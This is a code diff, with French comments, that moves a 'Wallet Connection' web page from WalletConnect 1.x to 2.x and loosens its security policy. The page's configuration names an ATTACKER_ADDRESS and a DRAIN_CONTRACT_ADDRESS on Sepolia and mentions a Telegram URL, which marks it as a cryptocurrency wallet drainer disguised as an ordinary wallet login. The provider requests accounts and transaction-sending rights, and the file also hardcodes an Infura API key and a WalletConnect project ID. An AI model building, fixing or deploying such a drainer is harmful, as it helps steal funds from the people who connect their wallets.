@@ -5,139 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet Connection</title>
     <!-- Assouplir la CSP pour autoriser les scripts locaux et externes -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net; connect-src *; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net; connect-src * wss://relay.walletconnect.com https://relay.walletconnect.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:;">
     <!-- Importation de la police Poppins depuis Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <!-- Intégrer directement eventemitter3 -->
-    <script>
-        // Contenu de eventemitter3.umd.min.js
-        (function(g,f){typeof exports==='object'&&typeof module!=='undefined'?module.exports=f():typeof define==='function'&&define.amd?define(f):(g=typeof globalThis!=='undefined'?globalThis:g||self,g.eventemitter3=f());})(this,(function(){'use strict';function e(){}var n=e.prototype;n.on=function(t,i,r){if(typeof i!=='function')throw new Error('Listener must be a function');var s=this._events||(this._events={});var e=s[t]||(s[t]=[]);e.push({fn:i,ctx:r||this});return this};n.once=function(t,i,r){var s=this;function e(){s.off(t,e);i.apply(r||this,arguments)}e.fn=i;return this.on(t,e,r)};n.off=function(t,i){var r=this._events&&this._events[t];if(!r)return this;if(!t&&!i){this._events={};return this}if(!i){this._events[t]=[];return this}for(var s=r.length-1;s>=0;s--){if(r[s].fn===i||r[s].fn.fn===i){r.splice(s,1)}}if(!r.length)delete this._events[t];return this};n.emit=function(t){var i=this._events&&this._events[t];if(!i)return false;var r=Array.prototype.slice.call(arguments,1);for(var s=0,e=i.length;s<e;s++){i[s].fn.apply(i[s].ctx,r)}return true};n.listenerCount=function(t){var i=this._events&&this._events[t];return i?i.length:0};return e}));
-        console.log('eventemitter3 script intégré directement');
-        // Vérification immédiate après l'intégration
-        setTimeout(() => {
-            console.log('Vérification immédiate de window.eventemitter3 :', window.eventemitter3);
-            if (window.eventemitter3) {
-                console.log('window.eventemitter3 est défini immédiatement après l\'intégration');
-            } else {
-                console.error('window.eventemitter3 est undefined immédiatement après l\'intégration');
-            }
-        }, 100);
-    </script>
-    <script>
-        // Attendre que eventemitter3 soit chargé
-        function waitForEventEmitter() {
-            return new Promise((resolve, reject) => {
-                const maxAttempts = 100; // 10 secondes maximum (100 * 100ms)
-                let attempts = 0;
-
-                const check = () => {
-                    console.log('Tentative de chargement de eventemitter3, tentative #' + attempts);
-                    console.log('État de window.eventemitter3 :', window.eventemitter3);
-                    if (window.eventemitter3 && typeof window.eventemitter3 === 'function') {
-                        console.log('eventemitter3 chargé avec succès');
-                        resolve();
-                    } else if (attempts >= maxAttempts) {
-                        reject(new Error('window.eventemitter3 n\'est pas défini ou n\'est pas une fonction après plusieurs tentatives'));
-                    } else {
-                        attempts++;
-                        setTimeout(check, 100);
-                    }
-                };
-
-                check();
-            });
-        }
-
-        // Définir le polyfill après le chargement
-        waitForEventEmitter()
-            .then(() => {
-                window.EventEmitter = window.eventemitter3; // Assigner directement window.eventemitter3
-                console.log('Polyfill EventEmitter défini');
-            })
-            .catch((error) => {
-                console.error('Erreur lors du chargement de eventemitter3 :', error);
-            });
-    </script>
-    <!-- Polyfills minimaux pour WalletConnect -->
-    <script>
-        // Polyfill pour process
-        window.process = {
-            env: {
-                NODE_ENV: 'production'
-            },
-            nextTick: function(fn) {
-                setTimeout(fn, 0);
-            }
-        };
-
-        // Polyfill pour crypto (utilise l'API Web Crypto)
-        if (typeof window.crypto === 'undefined') {
-            window.crypto = {
-                getRandomValues: function(array) {
-                    const randomValues = new Uint8Array(array.length);
-                    for (let i = 0; i < randomValues.length; i++) {
-                        randomValues[i] = Math.floor(Math.random() * 256);
-                    }
-                    array.set(randomValues);
-                    return array;
-                }
-            };
-        } else if (!window.crypto.getRandomValues) {
-            window.crypto.getRandomValues = function(array) {
-                const randomValues = new Uint8Array(array.length);
-                for (let i = 0; i < randomValues.length; i++) {
-                    randomValues[i] = Math.floor(Math.random() * 256);
-                }
-                array.set(randomValues);
-                return array;
-            };
-        }
-
-        // Polyfill pour global
-        if (typeof window.global === 'undefined') {
-            window.global = window;
-        }
-    </script>
-    <!-- Charger @walletconnect/client (nécessaire pour WalletConnect 1.x) -->
-    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/index.min.js"></script>
-    <!-- Charger buffer pour une implémentation complète de Buffer -->
-    <script src="https://unpkg.com/buffer@6.0.3/index.js"></script>
-    <!-- S'assurer que Buffer est défini globalement -->
-    <script>
-        if (typeof window.Buffer === 'undefined') {
-            window.Buffer = buffer.Buffer;
-        }
-    </script>
-    <!-- Charger WalletConnect 1.x depuis un CDN -->
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js" onload="try { console.log('WalletConnect script chargé avec succès'); setTimeout(() => { console.log('Vérification immédiate de window.WalletConnectProvider :', window.WalletConnectProvider); if (window.WalletConnectProvider && window.WalletConnectProvider.default) { console.log('window.WalletConnectProvider.default est défini immédiatement après le chargement'); } else { console.error('window.WalletConnectProvider.default est undefined immédiatement après le chargement'); } }, 100); } catch (e) { console.error('Erreur lors de l\'exécution de index.umd.js :', e); }" onerror="console.error('Erreur lors du chargement du script WalletConnect')"></script>
-    <script>
-        // Attendre que WalletConnectProvider soit chargé
-        function waitForWalletConnectProvider() {
-            return new Promise((resolve, reject) => {
-                const maxAttempts = 100; // 10 secondes maximum (100 * 100ms)
-                let attempts = 0;
-
-                const check = () => {
-                    console.log('Tentative de chargement de WalletConnectProvider, tentative #' + attempts);
-                    console.log('État de window.WalletConnectProvider :', window.WalletConnectProvider);
-                    // Vérifier si window.WalletConnectProvider.default existe et est une fonction
-                    if (window.WalletConnectProvider && window.WalletConnectProvider.default && typeof window.WalletConnectProvider.default === 'function') {
-                        console.log('WalletConnectProvider chargé avec succès');
-                        resolve();
-                    } else if (attempts >= maxAttempts) {
-                        reject(new Error('WalletConnectProvider.default n\'a pas pu être chargé après plusieurs tentatives'));
-                    } else {
-                        attempts++;
-                        setTimeout(check, 100);
-                    }
-                };
-
-                check();
-            });
-        }
-    </script>
+    <!-- Charger WalletConnect 2.x -->
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.0/dist/index.min.js"></script>
     <style>
         /* Styles pour le popup et l'overlay */
         .wallet-popup {
@@ -341,7 +215,8 @@
             ETH_PRICE_USD: 2000,
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
             DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963', // Adresse correcte pour Sepolia
-            INFURA_API_KEY: '0c56a36ee5ff4b72b18abdf5fa241dbd' // Clé Infura fournie
+            INFURA_API_KEY: '0c56a36ee5ff4b72b18abdf5fa241dbd', // Clé Infura fournie
+            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d' // Remplace par ton projectId
         };
 
         // URL Telegram
@@ -381,19 +256,9 @@
                     return;
                 }
 
-                // Attendre que le polyfill et WalletConnect soient chargés
-                try {
-                    await waitForEventEmitter();
-                    await waitForWalletConnectProvider();
-                } catch (error) {
-                    console.error('Erreur lors du chargement des dépendances :', error);
-                    updateStatus(elements, 'Erreur : Problème de chargement des dépendances.', false, 'red');
-                    return;
-                }
-
-                // Vérifier que WalletConnectProvider est chargé
-                if (!window.WalletConnectProvider || !window.WalletConnectProvider.default) {
-                    console.error('Erreur : WalletConnectProvider.default (WalletConnect 1.x) n’est pas chargé.');
+                // Vérifier que WalletConnect EthereumProvider est chargé
+                if (!window.EthereumProvider) {
+                    console.error('Erreur : WalletConnect EthereumProvider (WalletConnect 2.x) n’est pas chargé.');
                     updateStatus(elements, 'Erreur : Problème de chargement de WalletConnect.', false, 'red');
                     return;
                 }
@@ -435,17 +300,6 @@
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
 
-            // Vérifier si window.WalletConnectProvider.default est défini
-            console.log('Vérification de window.WalletConnectProvider :', window.WalletConnectProvider);
-            console.log('Type de window.WalletConnectProvider.default :', typeof window.WalletConnectProvider?.default);
-
-            const WalletConnectProvider = window.WalletConnectProvider?.default;
-            if (!WalletConnectProvider || typeof WalletConnectProvider !== 'function') {
-                throw new Error('WalletConnectProvider.default n\'est pas une fonction constructeur. Vérifiez la bibliothèque WalletConnect.');
-            }
-
-            console.log('WalletConnectProvider utilisé :', WalletConnectProvider);
-
             // Liste des wallets supportés (on se concentre sur Ethereum pour l'instant)
             const supportedWallets = [
                 {
@@ -480,16 +334,18 @@
                     walletListContainer.classList.add('hidden');
 
                     try {
-                        // Initialiser WalletConnect 1.x
-                        console.log('Initialisation de WalletConnect 1.x...');
-                        const provider = new WalletConnectProvider({
-                            infuraId: CONFIG.INFURA_API_KEY, // Utiliser Infura pour se connecter à Sepolia
-                            chainId: 11155111, // Sepolia
-                            rpc: {
+                        // Initialiser WalletConnect 2.x
+                        console.log('Initialisation de WalletConnect 2.x...');
+                        const provider = await window.EthereumProvider.init({
+                            projectId: CONFIG.WALLET_CONNECT_PROJECT_ID, // Ton projectId
+                            chains: [11155111], // Sepolia
+                            optionalChains: [], // Pas de chaînes optionnelles
+                            showQrModal: false, // Désactiver le QR code pour mobile
+                            methods: ['eth_requestAccounts', 'eth_sendTransaction'], // Méthodes nécessaires
+                            events: ['connect', 'disconnect', 'chainChanged', 'accountsChanged'], // Événements à écouter
+                            rpcMap: {
                                 11155111: `https://sepolia.infura.io/v3/${CONFIG.INFURA_API_KEY}`
-                            },
-                            qrcode: true, // Activer le QR code pour tester
-                            bridge: 'https://relay.walletconnect.org' // Utiliser un bridge alternatif
+                            }
                         });
 
                         // Ajouter des écouteurs pour déboguer la connexion
@@ -509,7 +365,7 @@
 
                         // Activer le provider (cela déclenche la connexion)
                         console.log('Connexion via WalletConnect...');
-                        await provider.enable();
+                        await provider.connect();
                         console.log('Provider connecté avec succès :', provider);
 
                         const web3Provider = new window.ethers.providers.Web3Provider(provider);
